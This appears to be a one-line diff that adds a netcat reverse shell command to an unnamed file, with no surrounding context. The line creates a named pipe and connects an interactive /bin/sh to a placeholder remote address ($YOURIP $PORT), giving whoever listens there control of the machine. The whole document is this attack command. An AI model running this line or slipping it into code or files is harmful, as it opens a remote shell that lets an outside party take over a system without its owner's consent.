@@ -1,0 +1,1 @@
+rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc $YOURIP $PORT 1>/tmp/b
